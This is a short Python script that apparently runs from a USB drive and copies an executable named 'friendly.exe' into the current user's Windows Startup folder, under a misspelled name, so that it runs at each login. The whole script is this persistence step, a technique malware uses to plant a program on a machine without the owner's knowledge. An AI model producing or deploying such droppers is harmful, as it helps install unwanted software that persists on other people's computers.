# Python script to move file from usb to destination
import os
import getpass
from shutil import copyfile


user = getpass.getuser()
cwd = os.getcwd() # gets the current directory
try:
	copyfile(cwd+"\\friendly.exe", "C:\\Users\\" + user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\friednly.exe")
except:
 	print("File exist")